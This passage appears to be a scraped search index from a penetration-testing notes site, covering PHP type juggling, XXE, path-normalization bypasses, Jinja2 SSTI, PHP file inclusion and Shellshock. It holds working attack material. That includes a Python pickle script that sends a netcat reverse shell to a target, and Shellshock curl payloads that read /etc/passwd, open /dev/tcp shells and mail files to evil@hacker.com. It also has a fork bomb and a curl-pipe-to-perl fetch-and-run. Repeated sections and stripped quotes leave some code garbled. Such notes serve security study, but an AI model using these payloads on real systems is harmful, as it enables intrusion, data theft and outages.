$COOKIE[\u2018token\u2019] != $token (\u20180e124656823434657657655654324342\u2019 != \u20180\u2019) will return FALSE var_dump(md5( 240610708 ) == md5( QNKCDZO )); var_dump(md5( aabg7XSs ) == md5( aabC9RqS )); var_dump(sha1( aaroZmOk ) == sha1( aaK1STfY )); var_dump(sha1( aaO8zKZF ) == sha1( aa3OFF9m )); var_dump( 0010e2 == 1e3 ); var_dump( 0x1234Ab == 1193131 ); var_dump( 0xABCdef == 0xABCdef ); MD5 var_dump(md5( 240610708 ) == md5( QNKCDZO )); 0e462097431906509019562988736854 == 0e830400451993494058024219903391 SHA1 0 e07766915004133176347055865026311692244 def find_email_with_juggle_md5 ( domain , max_prefix_length , hash_split_length ): count = 0 for check in itertools . imap ( . join , itertools . product ( string . lowercase , repeat = int ( max_prefix_length ))): hash = hashlib . md5 ( %s @ %s % ( check , domain )) . hexdigest () if hash_split_length 0 : hash = hash [: hash_split_length ] if re . match ( r 0+[eE]\\d+$ , hash ): print (+) Found %s @ %s , with %d attempts (hash: %s ) % ( check , domain , count , hash ) count += 1 https://www.whitehatsec.com/blog/magic-hashes/ Reduction in Entropy (Insecure HMAC) $secret = secure_random_secret_value ; $hmac = md5($secret . $_POST[ message ]); if($hmac == $_POST[ hmac ]) br // === Bypass by creating a hmac starting with `0e[0-9]` // var_dump( 0e123 == 0e51217526859264863 ); === TRUE shell_exec($_POST[ message ]); Hashing Algorithm Disclosure Given 240610708 and QNKCDZO attacker can guess that hashing algo is md5 var_dump(md5( 240610708 ) == md5( QNKCDZO )); === TRUE XML Internal entity: !ENTITY name entity_value !ENTITY test value test /value ?xml version= 1.0 ? !DOCTYPE data [ !ELEMENT data ANY !ENTITY name Replaced ] root t1 name; /t1 /root External entity: Private: !ENTITY name SYSTEM URI !ENTITY example SYSTEM http://example.com/example.xml Public: !ENTITY name PUBLIC public_id URI !ENTITY example PUBLIC -//W3C//TEXT examples//EN http://example.com/example.xml ?xml version= 1.0 ? !DOCTYPE data [ !ELEMENT data ANY !ENTITY name SYSTEM file:///etc/passwd ] root t1 name; /t1 /root Parameter Entity: !ENTITY % name SYSTEM URI !ENTITY % test Example !ENTITY Title This is %test; Unparsed: !ENTITY name SYSTEM URI NDATA TYPE !ENTITY name PUBLIC public_id URI NDATA TYPE CDATA It's not possible to ref to entity from another entity within the DTD defining those Hence, need external DTD: echo !ENTITY wrapper %start;%content;%end; wrapper.dtd ?xml version= 1.0 ? !DOCTYPE data [ !ENTITY % start ![CDATA[ !ENTITY % content SYSTEM file:///example/example.xml !ENTITY % end ]] !ENTITY % dtd SYSTEM http://example/wrapper.dtd %dtd; ] root t1 wrapper; /t1 /root Breaking Parsers https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf new URL ( file:///etc/passwd?/../../Windows/win.ini ) Windows: UNC: // etc / passwd ?/ .. / .. / Windows / win . ini Linux: URL: file : /// etc / passwd replace v.s. replaceAll ..\\Q/\\E is the new ../ in Grails / app / static / v.s. / app / static Nginx: location / static { alias / home / app / static / ; } In: http : // 127 . 0 . 0 . 1 / static .. / settings . py Out: / home / app / static / .. / settings . py 200 http : // target / assets / app . js 403 http : // target / assets / 404 http : // target / assets / .. / settings . py 403 http : // target / assets .. / 200 http : // target / assets .. / static / app . js 200 http : // target / assets .. / settings . py Spring 0day - CVE-2018-1271 http : // 0 : 8080 / spring - rabbit - stock / static /% 255 c % 255 c % 255 c % 255 c % 255 c % 255 c .. % 255 c .. % 255 c .. % 255 c .. % 255 c .. % 255 c .. % 255 c / Windows / win . ini Spark framework CVE-2018-9159 Same as Spring Rails 0day - CVE-2018-3760 Affected Rails under development environment Or production mode with flag assets.compile on Vuln Sprockets supports file:// scheme that bypassed absolute_path? URL decode bypassed double slashes normalization Method split_file_uri resolved URI and unescape again Lead to double encoding and bypass forbidden_request? and prefix check http : // 127 . 0 . 0 . 1 : 3000 / assets / file : % 2 f % 2 f / app / assets / images /% 252 e % 252 e /% 252 e % 252 e /% 252 e % 252 e / etc / passwd RCE: Inject query string %3F to File URL Render as ERB template if the extension is .erb http : // 127 . 0 . 0 . 1 : 3000 / assets / file : % 2 f % 2 f / app / assets / images /% 252 e % 252 e /% 252 e % 252 e /% 252 e % 252 e / tmp / evil . erb % 3 ftype = text / plain URL path parameter if you are using reverse proxy with Java as backend service http :// example . com / foo ; name = orange / bar / Bypass whitelist and blacklist ACL Escape from context mapping http :// example . com / portal /..;/ manager / html Tomcat thinks it should look at parent directory Example: Uber disallow direct access * . uberinternal . com Whitelisted API: https : // jira . uberinternal . com / status Attack: https :// jira . uberinternal . com / status /..;/ secure / Dashboard . jspa Nginx: / ..; / seems to be a directory with the / status whitelist . Pass to you ! Tomcat: / ..; / is the parent directory Inconsistency to ACL bypass Changing the 404 template file to / railo - context / .. / logs / exception . log curl https :// login . getbynder . com /..;/ railo-context / foo . cfm -d SHELL=-c curl orange.tw/bc.pl | perl -","title":"Languages"},{"location":"languages/#esoteric-languages","text":"Malbolge compiler: https://www.tutorialspoint.com/execute_malbolge_online.php Brainfuck Interpreter: https://sange.fi/esoteric/brainfuck/impl/interp/i.html Piet Interpreter: https://www.bertnase.de/npiet/npiet-execute.php","title":"Esoteric Languages"},{"location":"languages/#net","text":"Compiling cs files: C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ csc . exe test . cs Enabling debug: Src in C : \\ inetpub \\ wwwwroot \\ eample \\ bin \\ example . dll is loaded to C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ Temporary ASP . NET Files \\ example \\ dnSpy (Edit Assembly Attributes (C#)) Making an Image Easier to Debug: https://github.com/dnSpy/dnSpy/wiki/Making-an-Image-Easier-to-Debug From: [ assembly : Debuggable ( DebuggableAttribute . DebuggingModes . IgnoreSymbolStoreSequencePoints )] To: [ assembly : Debuggable ( DebuggableAttribute . DebuggingModes . Default | DebuggableAttribute . DebuggingModes . DisableOptimizations | DebuggableAttribute . DebuggingModes . IgnoreSymbolStoreSequencePoints | DebuggableAttribute . DebuggingModes . EnableEditAndContinue )] Compile and Save Module Debug Attach w3wp.exe Pause Debug Windows Modules Right Click - Open All Modules https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-dotnet-framework-source?view=vs-2019 https://www.domstamand.com/debugging-your-dotnet-applications-and-packages-howto/ Deserialization Ref: https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization https://github.com/pwntester/ysoserial.net System.Windows.Data.ObjectDataProvider https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN view=netframework-4.7.2 Inherits DataSourceProvider PresentationFramework.dll (C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\WPF) Wrap an arbitrary object use the MethodName property to call a method use the MethodParameters property to pass parameters BinaryFormatter - Serializes and deserializes an object, or an entire graph of connected objects, in binary format https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netcore-3.1 viewFallbackFrom=netframework-%204.7.2 BinaryFormatter is insecure and can't be made secure. BinaryFormatter security guide: https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide XML serialization: https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization ObjectDataProvider: https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=netcore-3 Use the ConstructorParameters property to pass parameters to the constructor of your object. Use the MethodName property to call a method and use the MethodParameters property to pass parameters to the method. You can then bind to the results of the method. ExpandedWrapper: https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2 https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html Videos","title":".Net"},{"location":"languages/#-alvaro-munoz-net-serialization-detecting-and-defending-vulnerable-endpoints-httpswwwyoutubecomwatchvqdobllwreyk","text":"","title":"- Alvaro Mu\u00f1oz: .NET Serialization: Detecting and defending vulnerable endpoints: https://www.youtube.com/watch?v=qDoBlLwREYk"},{"location":"languages/#c-c","text":"Unsafe functions strcpy strcat","title":"C / C++"},{"location":"languages/#go","text":"Environment Setup Preparing Your Environment For Go Development: https://www.gopherguides.com/courses/preparing-your-environment-for-go-development?utm_source=twitter utm_campaign=install utm_medium=twitter References https://github.com/parsiya/Hacking-with-Go https://www.blackhat.com/docs/asia-17/materials/asia-17-Clapis-Go-Get-My-Vulnerabilities-An-In-Depth-Analysis-Of-Go-Language-Runtime-And-The-New-Class-Of-Vulnerabilities-It-Introduces.pdf","title":"GO"},{"location":"languages/#java","text":"Simple steps to create Jar javac -source 1 .8 -target 1 .8 test.java mkdir META-INF echo Main-Class: test META-INF/MANIFEST.MF jar cmvf META-INF/MANIFEST.MF test.jar test.class java -jar test.jar Debug -Xdebug -Xnoagent -Xrunjdwp:transport = dt_socket,address = 8787 ,server = y ,suspend = n jdb -attach example:8787 jdb -sourcepath . -attach example:8787 # jdb with the sourcepath stop in full package . class . method list # add to tomcat-verison/bin/startup.sh export JPDA_ADDRESS = 8000 export JPDA_TRANSPORT = dt_socket # modify last line to exec $PRGDIR / $EXECUTABLE jpda start $@ Deserialization https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet Decode serialized data: https://github.com/NickstaDB/SerializationDumper https://www.youtube.com/watch?v=KSA7vUkXGSg Deserialization: what, how and why [not] - Alexei Kojenov - AppSecUSA 2018: https://www.youtube.com/watch?v=t-zVC-CxYjw Very good basic introduction Death by deserialization: https://youtu.be/t-zVC-CxYjw?t=1155 Automated Discovery of Deserialization Gadget Chains: https://www.youtube.com/watch?v=MTfE2OgUlKc History of important sessions: https://youtu.be/MTfE2OgUlKc?t=309 Basic example to magic methods (hashCode example) to Gadget chains https://github.com/JackOfMostTrades/gadgetinspector Libraries Commons Collection: https://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html Conjure Scala-Library Conjure2 New Exploit Technique In Java Deserialization Attack: https://www.youtube.com/watch?v=Lv9BC_bYaI8 CVE-2019-1040 - NTLM reflection attack CVE-2019-2426 - ntlm leaking https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html Defense Look ahead check JEP290 - Filter Incoming Serialization Data Runtime application self protection (RASP) Java-Agent Tools https://github.com/JackOfMostTrades/gadgetinspector Enum class hierarchy Discover passthrough dataflow Enum passthrough callgraph Enum source using known tricks ( entry points into gadget-chains ) HashCode DynamicProxy BFS on call graph for chains https://github.com/frohoff/ysoserial https://github.com/mbechler/marshalsec https://github.com/Contrast-Security-OSS/joogle https://github.com/federicodotta/Java-Deserialization-Scanner https://github.com/nccgroup/freddy References LLJVM - running comparatively low level languages (such as C) on the JVM: https://github.com/davidar/lljvm Java deserialization attacks: Java-Deserialization-Cheat-Sheet https://github.com/NickstaDB/SerializationDumper https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/ https://github.com/NickstaDB/DeserLab https://github.com/NickstaDB/BaRMIe JSF: https://bitbucket.org/gebl/viewstatemesser/src/master/ https://bitbucket.org/gebl/appseccali-jsf-el/src/master/ https://github.com/frohoff/inspector-gadget New Technologies Feign is a Java to HTTP client binder inspired by Retrofit, JAXRS-2.0, and WebSocket: https://github.com/OpenFeign/feign resilience4j: https://resilience4j.readme.io/docs/getting-started","title":"Java"},{"location":"languages/#javascript","text":"Tools CharCode Translator: http://jdstiles.com/java/cct.html img src= x/ script eval(String.fromCharCode(CHARCODE_HERE)); /script","title":"JavaScript"},{"location":"languages/#nodejs-javascript","text":"Look for eval () Tools Serialize an object including it's function into a JSON Contents for Node.Js Security Course References Eval Safe-Eval VM VM2: https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/ https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html Exploiting deserialization bugs in Node.js modules for Remote Code Execution Exploiting Node.js deserialization bug for Remote Code Execution Node.js Security: Pentesting and Exploitation \u2013 NJS https://github.com/ajinabraham/Node.Js-Security-Course https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/node.js-deserialization.md https://www.vulnhub.com/entry/moonraker-1,264/ Node.Js Deserialization Attack \u2013 Detailed Tutorial 2018","title":"NodeJS / JavaScript"},{"location":"languages/#rails","text":"Rails' Remote Code Execution Vulnerability Explained","title":"Rails"},{"location":"languages/#regex","text":"References Regex tutorial\u200a\u2014\u200aA quick cheatsheet by examples: https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285 Exploiting Regular Expressions: https://medium.com/@somdevsangwan/exploiting-regular-expressions-2192dbbd6936","title":"RegEx"},{"location":"languages/#rust","text":"References Fearless Concurrency with Rust: https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html","title":"Rust"},{"location":"languages/#python","text":"Internals: Objects, Classes and Metaclasses - Above and Under the Hood: http://cben-hacks.sourceforge.net/python/lectures/metaclasses/metaclasses.html https://blog.usejournal.com/playing-with-inheritance-in-python-73ea4f3b669e ' Type vs Object: https://lerner.co.il/2015/10/18/pythons-objects-and-classes-a-visual-guide/ Script to inspect: https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py Debugging using ptvsd pip install ptvsd If Procfile is used disable start of web server automatically by commenting web : section Add following to app: import ptvsd ptvsd . enable_attach ( redirect_output = True ) print ( Waiting for debugger ) ptvsd . wait_for_attach () Get attributes and methods of a object: s = HELLO dir ( s ) __class__ attribute - type of object __mro__ attribute (Method Resolution Order)) - tuple of classes in the search order __subclasses__ returns a list of all the subclasses of a class __bases__ provides a tuple of immediate base classes of a class. SSTI https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti https://0day.work/jinja2-template-injection-filter-bypasses/ SSTI patterns: s . __class__ . __base__ . __subclasses__ () s . __class__ . __mro__ [ 1 ]. __subclasses__ () Searching: c = HELLO . __class__ . __base__ . __subclasses__ () for i in range ( len ( c )): print ( i , c [ i ] . __name__ ) for i in range ( len ( c )): n = c [ i ] . __name__ if n . find ( warning ) - 1 : # Find specific function name print ( i , n ) Common interesting functions: catch_warnings: s . __class__ . __base__ . __subclasses__ ()[ 100 ]. _module . __builtins__ [ __import__ ]( os ). system ( date ) read: s . __class__ . __base__ . __subclasses__ ()[ 100 ]( /etc/passwd ). read () popen: s . __class__ . __base__ . __subclasses__ ()[ 100 ]([ /usr/bin/touch , /tmp/example ]) Common sinks: flask . render_template_string ( source , ** context ) Vars: request session config g - globals May bruteforce with https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names https://flask.palletsprojects.com/en/1.0.x/templating/#standard-context https://jinja.palletsprojects.com/en/master/templates/#builtin-globals First, inject something like {{ ''. class . mro [2]. subclasses () 40 .write(' '') }} into the SSTI vulnerability. Then, invoke the compilation process by injecting {{ config.from_pyfile('/tmp/owned.cfg') }}. The code will execute upon compilation. https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/ Challenges https://www.hackingnote.com/en/python-challenge-solutions/level-5 Tools ZipApps - similar to JAR pipX - pip with virtual env Shiv - Modified ZipApp to work with C extensions Packaging: The bible of packaging python apps in docker Attack Vectors - Exploiting Imports - It is possible to create a .py file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library. - cPickle RCE - Arbitrary code execution with Python pickles - Python Pickle Injection - https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/ - https://blog.nelhage.com/2011/03/exploiting-pickle/ - https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module - HTB - DevOps - HTB - Challenge - Mics - Long Bottom's Locker - https://www.hackingnote.com/en/python-challenge-solutions/level-5 - Pickle formats: http://spootnik.org/entries/2014/04/05/diving-into-the-python-pickle-formatt/index.html #!/usr/bin/python3 import sys import pickle f = open ( sys . argv [ 1 ], rb ) mydict = pickle . load ( f ) f . close for line in mydict : print ( . join ([ k * v for k , v in line ])) for i in mydict : b = [] for x in i : #print x b . append ( x [ 0 ] * x [ 1 ]) print ( . join ( b )) import cPickle , requests , base64 LHOST = 10.10.14.14 LPORT = 31337 RHOST = 10.10.10.91 RPORT = 5000 class Payload ( object ): def __init__ ( self , cmd ): self . cmd = cmd def __reduce__ ( self ): import os return ( os . system , ( self . cmd ,)) reverse_sh = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc %s %s /tmp/f % ( LHOST , LPORT ) evilpickle = cPickle . dumps ( Payload ( reverse_sh )) r = requests . post ( http:// %s : %s /newpost % ( RHOST , RPORT ), data = base64 . urlsafe_b64encode ( evilpickle )) print ( POST {} {} . format ( r . status_code , r . url )) Pickle to object: import pickle import base64 pickled = base64 . b64decode ( Value ) pickle . load ( pickled )","title":"Python"},{"location":"languages/#php","text":"Extensions: .php .php3 .php4 .php5 .php7 .phps .phtml .inc .phar","title":"PHP"},{"location":"languages/#cheatsheets","text":"https://www.logicbig.com/tutorials/misc/php/php-advance-cheat-sheet.html http://overapi.com/php https://courses.cs.washington.edu/courses/cse154/18au/resources/cheatsheets/php-cheatsheet.pdf","title":"Cheatsheets"},{"location":"languages/#references","text":"dangerous-php-functions: https://alionder.net/dangerous-php-functions/ Understanding PHP Object Injection https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ http://pentestmonkey.net/tools/web-shells/php-reverse-shell PHP Remote File Inclusion command shell using data:// Hardening and securing PHP on Linux HTTP Parameter Pollution with cookies in PHP","title":"References"},{"location":"languages/#attack-vectors","text":"","title":"Attack Vectors"},{"location":"languages/#terminate-strings-using-null-byte","text":"Before PHP 5 . 3 terminate strings using null byte is possible (%00 in URL) http : // example . com ? param = .. / .. / .. / .. / etc / passed - / etc / passed . php http : // example . com ? param = .. / .. / .. / .. / etc / passed % 00 - / etc / passed","title":"Terminate strings using null byte**"},{"location":"languages/#vulnerable-functions","text":"Local / Remote file inclusion bugs: include() include_once() require() require_once() Local / Remote command execution bugs: eval() preg_replace() fwrite() passthru() file_get_contents() shell_exec() system() SQL Injection bugs: mysql_query() File / File system bugs: fopen() readfile() glob() file() popen() exec() https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/","title":"Vulnerable Functions"},{"location":"languages/#rce-with-preg-functions","text":"implement regular expressions for the preg_ functions (preg_match, preg_replace) / e modifier which allows evaluation of PHP code in the preg_replace Example: ?php $string = this is my lower sting ; print preg_replace ( /(.*)/e , strtoupper( \\\\1 ) , $string ); ? // THIS IS MY LOWER STING Example Attack: ?php $string = phpinfo() ; print preg_replace ( /^(.*)/e , strtoupper(\\\\1) , $string ); ? Filter Evasion: - Prevent single quote and escape chars Following will fail: $string = system( ls -lah ) ; Bypass: $string = `ls -lah` ; Ref: http://www.madirish.net/402","title":"RCE with PREG Functions"},{"location":"languages/#lfi-with-filter-inclusion","text":"Useful when LFI is possible but \".php\" is appended at end (and not vulnerable to null byte injection) filter / convert . base64 - encode forces PHP to base64 encode the file before it is used in the require statement ( index \u200b . php ) http://example.com/?page=php://filter/convert.base64-encode/resource=index\u200b","title":"LFI with Filter Inclusion"},{"location":"languages/#lfi-with-zip-inclusion-include-a-file-inside-a-zip","text":"If it is possible to upload a zip file http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id","title":"LFI with Zip Inclusion (Include a file inside a zip)"},{"location":"languages/#lfi-to-rfi","text":"Possible if allow_url_include is on","title":"LFI to RFI"},{"location":"languages/#type-juggling","text":"Magic hashes https://www.whitehatsec.com/blog/magic-hashes/ https://github.com/spaze/hashes Fixed in v7 (except for exponent) References: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/ https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ 0e1234 == 0e4321 0e1234 == 0 0e1234 = 1 0xf == 15 #0xf in hexadecimal notation is 15 000...000 == int(0) 0e0...000 == int(0) 1e0...000 == int(1) 0abc...000 == int(0) abc...000 == int(0) # if a string starts with a non numerical character it will default to int(0) var_dump( 2 bottles == 2); // == TRUE $values = array( apple , orange , pear , grape ); in_array(0, $values); // == TRUE if($password == secretpass ) // == TRUE when $password=0 Example: php $token = 0e124656823434657657655654324342 ; if(isset($_COOKIE[ token ]) $_COOKIE[ token ] == $token) { // access to privilege area } else { // login require } ? $COOKIE[\u2018token\u2019] == $token (\u20180e124656823434657657655654324342\u2019 == \u20180\u2019) will return TRUE $COOKIE[\u2018token\u2019] != $token (\u20180e124656823434657657655654324342\u2019 != \u20180\u2019) will return FALSE var_dump(md5( 240610708 ) == md5( QNKCDZO )); var_dump(md5( aabg7XSs ) == md5( aabC9RqS )); var_dump(sha1( aaroZmOk ) == sha1( aaK1STfY )); var_dump(sha1( aaO8zKZF ) == sha1( aa3OFF9m )); var_dump( 0010e2 == 1e3 ); var_dump( 0x1234Ab == 1193131 ); var_dump( 0xABCdef == 0xABCdef ); MD5 var_dump(md5( 240610708 ) == md5( QNKCDZO )); 0e462097431906509019562988736854 == 0e830400451993494058024219903391 SHA1 0 e07766915004133176347055865026311692244 def find_email_with_juggle_md5 ( domain , max_prefix_length , hash_split_length ): count = 0 for check in itertools . imap ( . join , itertools . product ( string . lowercase , repeat = int ( max_prefix_length ))): hash = hashlib . md5 ( %s @ %s % ( check , domain )) . hexdigest () if hash_split_length 0 : hash = hash [: hash_split_length ] if re . match ( r 0+[eE]\\d+$ , hash ): print (+) Found %s @ %s , with %d attempts (hash: %s ) % ( check , domain , count , hash ) count += 1 https://www.whitehatsec.com/blog/magic-hashes/","title":"Type Juggling"},{"location":"languages/#reduction-in-entropy-insecure-hmac","text":"$secret = secure_random_secret_value ; $hmac = md5($secret . $_POST[ message ]); if($hmac == $_POST[ hmac ]) br // === Bypass by creating a hmac starting with `0e[0-9]` // var_dump( 0e123 == 0e51217526859264863 ); === TRUE shell_exec($_POST[ message ]);","title":"Reduction in Entropy (Insecure HMAC)"},{"location":"languages/#hashing-algorithm-disclosure","text":"Given 240610708 and QNKCDZO attacker can guess that hashing algo is md5 var_dump(md5( 240610708 ) == md5( QNKCDZO )); === TRUE","title":"Hashing Algorithm Disclosure"},{"location":"languages/#xml","text":"Internal entity: !ENTITY name entity_value !ENTITY test value test /value ?xml version= 1.0 ? !DOCTYPE data [ !ELEMENT data ANY !ENTITY name Replaced ] root t1 name; /t1 /root External entity: Private: !ENTITY name SYSTEM URI !ENTITY example SYSTEM http://example.com/example.xml Public: !ENTITY name PUBLIC public_id URI !ENTITY example PUBLIC -//W3C//TEXT examples//EN http://example.com/example.xml ?xml version= 1.0 ? !DOCTYPE data [ !ELEMENT data ANY !ENTITY name SYSTEM file:///etc/passwd ] root t1 name; /t1 /root Parameter Entity: !ENTITY % name SYSTEM URI !ENTITY % test Example !ENTITY Title This is %test; Unparsed: !ENTITY name SYSTEM URI NDATA TYPE !ENTITY name PUBLIC public_id URI NDATA TYPE CDATA It's not possible to ref to entity from another entity within the DTD defining those Hence, need external DTD: echo !ENTITY wrapper %start;%content;%end; wrapper.dtd ?xml version= 1.0 ? !DOCTYPE data [ !ENTITY % start ![CDATA[ !ENTITY % content SYSTEM file:///example/example.xml !ENTITY % end ]] !ENTITY % dtd SYSTEM http://example/wrapper.dtd %dtd; ] root t1 wrapper; /t1 /root","title":"XML"},{"location":"languages/#breaking-parsers","text":"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf new URL ( file:///etc/passwd?/../../Windows/win.ini ) Windows: UNC: // etc / passwd ?/ .. / .. / Windows / win . ini Linux: URL: file : /// etc / passwd replace v.s. replaceAll ..\\Q/\\E is the new ../ in Grails / app / static / v.s. / app / static Nginx: location / static { alias / home / app / static / ; } In: http : // 127 . 0 . 0 . 1 / static .. / settings . py Out: / home / app / static / .. / settings . py 200 http : // target / assets / app . js 403 http : // target / assets / 404 http : // target / assets / .. / settings . py 403 http : // target / assets .. / 200 http : // target / assets .. / static / app . js 200 http : // target / assets .. / settings . py Spring 0day - CVE-2018-1271 http : // 0 : 8080 / spring - rabbit - stock / static /% 255 c % 255 c % 255 c % 255 c % 255 c % 255 c .. % 255 c .. % 255 c .. % 255 c .. % 255 c .. % 255 c .. % 255 c / Windows / win . ini Spark framework CVE-2018-9159 Same as Spring Rails 0day - CVE-2018-3760 Affected Rails under development environment Or production mode with flag assets.compile on Vuln Sprockets supports file:// scheme that bypassed absolute_path? URL decode bypassed double slashes normalization Method split_file_uri resolved URI and unescape again Lead to double encoding and bypass forbidden_request? and prefix check http : // 127 . 0 . 0 . 1 : 3000 / assets / file : % 2 f % 2 f / app / assets / images /% 252 e % 252 e /% 252 e % 252 e /% 252 e % 252 e / etc / passwd RCE: Inject query string %3F to File URL Render as ERB template if the extension is .erb http : // 127 . 0 . 0 . 1 : 3000 / assets / file : % 2 f % 2 f / app / assets / images /% 252 e % 252 e /% 252 e % 252 e /% 252 e % 252 e / tmp / evil . erb % 3 ftype = text / plain URL path parameter if you are using reverse proxy with Java as backend service http :// example . com / foo ; name = orange / bar / Bypass whitelist and blacklist ACL Escape from context mapping http :// example . com / portal /..;/ manager / html Tomcat thinks it should look at parent directory Example: Uber disallow direct access * . uberinternal . com Whitelisted API: https : // jira . uberinternal . com / status Attack: https :// jira . uberinternal . com / status /..;/ secure / Dashboard . jspa Nginx: / ..; / seems to be a directory with the / status whitelist . Pass to you ! Tomcat: / ..; / is the parent directory Inconsistency to ACL bypass Changing the 404 template file to / railo - context / .. / logs / exception . log curl https :// login . getbynder . com /..;/ railo-context / foo . cfm -d SHELL=-c curl orange.tw/bc.pl | perl -","title":"Breaking Parsers"},{"location":"linux-issues/","text":"Collections https://github.com/lucyoa/kernel-exploits Exploits CVE-2014-6271 - Shellshock Bash 4 . 3 and earlier Execute commands from environment variables unintentionally. Caused by Bash processing trailing strings after function definitions in the values of environment variables. Exploitable when attacker has control of environment variables. https://fedoramagazine.org/shellshock-how-does-it-actually-work/ GET http :// shellshock . testsparker . com / cgi-bin / netsparker . cgi HTTP / 1 . 1 User-Agent : Netsparker Host : shellshock . testsparker . com Referer : () { : ;} ; echo NS: $( / etc / passwd ) Test if Vulnerable env x = () { :;}; echo OOPS bash -c : env x = () { :;}; echo vulnerable bash -c echo not-vulnerable Explanation To run a command in a new shell bash -c ls New shell inherits environment If new shell finds what seems to be a function in an environment variable: New shell executes the function to get the actual value When function is executed, evaluation didn't stop when the end of the function definition is reached. Hence, when new shell sees () { :; } ; , bash will start executing the function and proceed to also execute the echo . Samples Passwd curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/cat /etc/passwd http://192.168.1.14/cgi-bin/status curl -H user-agent: () { :; }; echo; echo; /bin/bash -c cat /etc/passwd \\ http://192.168.1.14/cgi-bin/status Directory Listing curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/ls / http://192.168.1.14/cgi-bin/status Reverse shell curl -A () { :; }; /bin/bash -c /usr/bin/nc -lvvp 2345 -e /bin/bash http://192.168.1.14/cgi-bin/status curl -H User-Agent: () { :; }; /bin/bash -i /dev/tcp/10.10.14.203/1234 0 1 http://10.10.10.56/cgi-bin/user.sh Setuid shell: () { :; } ; cp / bin / bash / tmp / bash chmod 4755 / tmp / bash Fork Bomb: () { :; } ; :() { : | : } ;: Ping Bot: () { :; } ; ping - s 1000000 victim IP Data Theft: () { : ; } ; find ~ - print | mail - s Your files evil @hacker . com () { : ; } ; cat ~/ . secret / passwd | mail - s This password file evil @hacker . com Exploitation Vectors https://github.com/opsxcq/exploit-CVE-2014-6271 CGI Bash will receive the environment variables passed by the server Server passes various details of the request to a handler program in the environment variable list. For example, HTTP_USER_AGENT . exploit / multi / http / apache_mod_cgi_bash_env_exec Apache mod_cgi - 'Shellshock' Remote Command Injection OpenSSH ForceCommand will execute a fixed command on login If user specify a command to run, user specific command is put into environment ( SSH_ORIGINAL_COMMAND ) Bash will parse SSH_ORIGINAL_COMMAND on start-up, and run the commands DHCP clients Some DHCP clients can also pass commands to Bash Malicious DHCP server provide, a string crafted to execute code (in an addition option) Qmail server Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash. IBM HMC restricted shell References Shellshock: How does it actually work? [Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability Practice https://pentesterlab.com/exercises/cve-2014-6271 [Docker] Shellshock exploit + vulnerable environment HTB - Shocker CVE-2014-7169 CVE-2014-0160 - Heartbleed Exploits https://github.com/sensepost/heartbleed-poc https://gist.github.com/eelsivart/10174134 References https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/ CVE-2016-4971 - GNU Wget 1.18 - Arbitrary File Upload / Remote Code Execution issuing a crafted HTTP 30X Redirect containing FTP server reference in response wget will automatically follow the redirect wget will download 